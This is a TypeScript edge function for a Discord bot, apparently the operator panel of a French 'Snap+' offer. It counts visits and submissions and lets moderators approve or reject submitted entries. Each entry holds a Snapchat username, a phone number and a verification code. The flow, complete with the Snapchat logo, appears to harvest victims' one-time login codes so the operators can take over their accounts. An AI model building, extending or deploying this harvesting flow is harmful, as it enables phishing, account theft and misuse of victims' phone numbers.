import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
import nacl from "https://esm.sh/tweetnacl@1.0.3";

// Discord interaction types
const INTERACTION_TYPE = {
  PING: 1,
  APPLICATION_COMMAND: 2,
  MESSAGE_COMPONENT: 3,
};

const INTERACTION_RESPONSE_TYPE = {
  PONG: 1,
  CHANNEL_MESSAGE_WITH_SOURCE: 4,
  DEFERRED_CHANNEL_MESSAGE_WITH_SOURCE: 5,
  DEFERRED_UPDATE_MESSAGE: 6,
  UPDATE_MESSAGE: 7,
};

function hexToUint8Array(hex: string): Uint8Array {
  const matches = hex.match(/.{1,2}/g);
  if (!matches) return new Uint8Array();
  return new Uint8Array(matches.map(byte => parseInt(byte, 16)));
}

async function verifyDiscordRequest(request: Request, publicKey: string): Promise<{ isValid: boolean; body: string }> {
  const signature = request.headers.get('X-Signature-Ed25519');
  const timestamp = request.headers.get('X-Signature-Timestamp');
  const body = await request.text();

  if (!signature || !timestamp) return { isValid: false, body };

  const isValid = nacl.sign.detached.verify(
    new TextEncoder().encode(timestamp + body),
    hexToUint8Array(signature),
    hexToUint8Array(publicKey)
  );

  return { isValid, body };
}

serve(async (req) => {
  const DISCORD_PUBLIC_KEY = Deno.env.get('DISCORD_PUBLIC_KEY');
  
  if (!DISCORD_PUBLIC_KEY) {
    console.error('Missing DISCORD_PUBLIC_KEY');
    return new Response('Server configuration error', { status: 500 });
  }

  // Verify Discord signature
  const { isValid, body } = await verifyDiscordRequest(req, DISCORD_PUBLIC_KEY);
  if (!isValid) {
    return new Response('Invalid request signature', { status: 401 });
  }

  const interaction = JSON.parse(body);
  const DISCORD_BOT_TOKEN = Deno.env.get('DISCORD_BOT_TOKEN');

  // Handle Discord PING (for URL verification)
  if (interaction.type === INTERACTION_TYPE.PING) {
    return new Response(JSON.stringify({ type: INTERACTION_RESPONSE_TYPE.PONG }), {
      headers: { 'Content-Type': 'application/json' },
    });
  }

  // Handle slash commands
  if (interaction.type === INTERACTION_TYPE.APPLICATION_COMMAND) {
    const commandName = interaction.data.name;

    // /say command
    if (commandName === 'say') {
      const message = interaction.data.options?.find((o: { name: string }) => o.name === 'message')?.value;
      
      if (!message) {
        return new Response(JSON.stringify({
          type: INTERACTION_RESPONSE_TYPE.CHANNEL_MESSAGE_WITH_SOURCE,
          data: {
            content: "❌ Veuillez fournir un message.",
            flags: 64 // Ephemeral - only visible to user
          }
        }), { headers: { 'Content-Type': 'application/json' } });
      }

      // Send the message to the channel
      const channelId = interaction.channel_id;
      
      await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
        method: 'POST',
        headers: {
          'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ content: message })
      });

      // Reply with ephemeral confirmation
      return new Response(JSON.stringify({
        type: INTERACTION_RESPONSE_TYPE.CHANNEL_MESSAGE_WITH_SOURCE,
        data: {
          content: "✅ Message envoyé !",
          flags: 64
        }
      }), { headers: { 'Content-Type': 'application/json' } });
    }

    // /stats command
    if (commandName === 'stats') {
      const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
      const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
      const supabase = createClient(supabaseUrl, supabaseKey);

      // Fetch statistics
      const [
        { count: totalVisits },
        { data: lastVisit },
        { count: totalSubmissions },
        { data: lastSubmission },
        { count: codesSubmitted },
        { count: codesApproved },
        { count: codesRejected },
        { data: statsConfig }
      ] = await Promise.all([
        supabase.from('visits').select('*', { count: 'exact', head: true }),
        supabase.from('visits').select('visited_at').order('visited_at', { ascending: false }).limit(1).single(),
        supabase.from('submissions').select('*', { count: 'exact', head: true }),
        supabase.from('submissions').select('created_at').order('created_at', { ascending: false }).limit(1).single(),
        supabase.from('submissions').select('*', { count: 'exact', head: true }).not('code', 'is', null),
        supabase.from('submissions').select('*', { count: 'exact', head: true }).eq('status', 'approved'),
        supabase.from('submissions').select('*', { count: 'exact', head: true }).eq('status', 'rejected'),
        supabase.from('stats_config').select('*').eq('id', 'main').single()
      ]);

      const now = new Date();
      const startedAt = statsConfig?.started_at ? new Date(statsConfig.started_at) : now;
      
      // Calculate uptime
      const diff = now.getTime() - startedAt.getTime();
      const days = Math.floor(diff / (1000 * 60 * 60 * 24));
      const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
      const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
      const uptime = `${days}j ${hours}h ${minutes}m`;

      // Format date
      const formatDateTime = (date: Date) => date.toLocaleDateString('fr-FR', {
        day: '2-digit', month: '2-digit', year: 'numeric'
      }) + ' ' + date.toLocaleTimeString('fr-FR', {
        hour: '2-digit', minute: '2-digit', second: '2-digit'
      });

      // Calculate percentages
      const totalCodes = codesSubmitted || 0;
      const approvedPercent = totalCodes > 0 ? ((codesApproved || 0) / totalCodes * 100).toFixed(1) : '0.0';
      const rejectedPercent = totalCodes > 0 ? ((codesRejected || 0) / totalCodes * 100).toFixed(1) : '0.0';

      const embed = {
        title: "📊 Statistiques en temps réel - Snap+",
        color: 0x2B2D31,
        fields: [
          {
            name: "👥 Visiteurs",
            value: [
              `🌐 **Total des visites:** ${totalVisits || 0}`,
              `🕐 **Dernière visite:** ${lastVisit?.visited_at ? formatDateTime(new Date(lastVisit.visited_at)) : 'Aucune'}`
            ].join('\n'),
            inline: false
          },
          {
            name: "📝 Inscriptions",
            value: [
              `📋 **Total inscriptions:** ${totalSubmissions || 0}`,
              `🕐 **Dernière inscription:** ${lastSubmission?.created_at ? formatDateTime(new Date(lastSubmission.created_at)) : 'Aucune'}`
            ].join('\n'),
            inline: false
          },
          {
            name: "🔐 Codes de vérification",
            value: [
              `📤 **Codes soumis:** ${codesSubmitted || 0}`,
              `✅ **Codes acceptés:** ${codesApproved || 0} (${approvedPercent}%)`,
              `❌ **Codes rejetés:** ${codesRejected || 0} (${rejectedPercent}%)`
            ].join('\n'),
            inline: false
          },
          {
            name: "⚙️ Système",
            value: `🟢 **Uptime:** ${uptime}`,
            inline: false
          }
        ],
        footer: {
          text: `Demandé par ${interaction.member?.user?.username || 'Utilisateur'}`
        },
        timestamp: now.toISOString()
      };

      return new Response(JSON.stringify({
        type: INTERACTION_RESPONSE_TYPE.CHANNEL_MESSAGE_WITH_SOURCE,
        data: {
          embeds: [embed]
        }
      }), { headers: { 'Content-Type': 'application/json' } });
    }

    return new Response(JSON.stringify({
      type: INTERACTION_RESPONSE_TYPE.CHANNEL_MESSAGE_WITH_SOURCE,
      data: {
        content: "❌ Commande inconnue.",
        flags: 64
      }
    }), { headers: { 'Content-Type': 'application/json' } });
  }

  // Handle button interactions
  if (interaction.type === INTERACTION_TYPE.MESSAGE_COMPONENT) {
    const customId = interaction.data.custom_id;
    const [action, submissionId] = customId.split('_');

    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
    const supabaseKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    const supabase = createClient(supabaseUrl, supabaseKey);

    // Get submission info
    const { data: submission } = await supabase
      .from('submissions')
      .select('*')
      .eq('id', submissionId)
      .single();

    if (!submission) {
      return new Response(JSON.stringify({
        type: INTERACTION_RESPONSE_TYPE.UPDATE_MESSAGE,
        data: {
          content: "❌ Soumission introuvable.",
          embeds: [],
          components: []
        }
      }), { headers: { 'Content-Type': 'application/json' } });
    }

    const newStatus = action === 'approve' ? 'approved' : 'rejected';

    // Update status in database
    await supabase
      .from('submissions')
      .update({ status: newStatus })
      .eq('id', submissionId);

    const isApproved = action === 'approve';
    const statusEmoji = isApproved ? '✅' : '❌';
    const statusText = isApproved ? 'APPROUVÉ' : 'REFUSÉ';
    const color = isApproved ? 0x22C55E : 0xEF4444;
    const description = isApproved 
      ? "L'utilisateur a été validé avec succès ! Snap+ est maintenant actif."
      : "La demande a été refusée. L'utilisateur devra réessayer.";

    // Formater le numéro de téléphone
    const formatPhone = (p: string) => {
      const clean = p.replace(/^0/, '');
      return clean.replace(/(\d{1})(\d{2})(\d{2})(\d{2})(\d{2})/, '$1 $2 $3 $4 $5');
    };

    const updatedEmbed = {
      title: `${statusEmoji} Demande ${statusText}`,
      description: description,
      color: color,
      thumbnail: {
        url: "https://upload.wikimedia.org/wikipedia/fr/a/ad/Logo-Snapchat.png"
      },
      fields: [
        { name: "👤 Nom d'utilisateur", value: `\`${submission.username}\``, inline: true },
        { name: "🔢 Code", value: `\`${submission.code || 'N/A'}\``, inline: true },
        { name: "📞 Téléphone", value: `+33 ${formatPhone(submission.phone)}`, inline: false },
      ],
      footer: { 
        text: `Traité par ${interaction.member?.user?.username || 'Modérateur'}`,
        icon_url: isApproved 
          ? "https://cdn-icons-png.flaticon.com/512/845/845646.png"
          : "https://cdn-icons-png.flaticon.com/512/753/753345.png"
      },
      timestamp: new Date().toISOString(),
    };

    // Update the message with result (remove buttons)
    return new Response(JSON.stringify({
      type: INTERACTION_RESPONSE_TYPE.UPDATE_MESSAGE,
      data: {
        embeds: [updatedEmbed],
        components: [] // Remove buttons after action
      }
    }), { headers: { 'Content-Type': 'application/json' } });
  }

  return new Response(JSON.stringify({ error: 'Unknown interaction type' }), {
    status: 400,
    headers: { 'Content-Type': 'application/json' },
  });
});
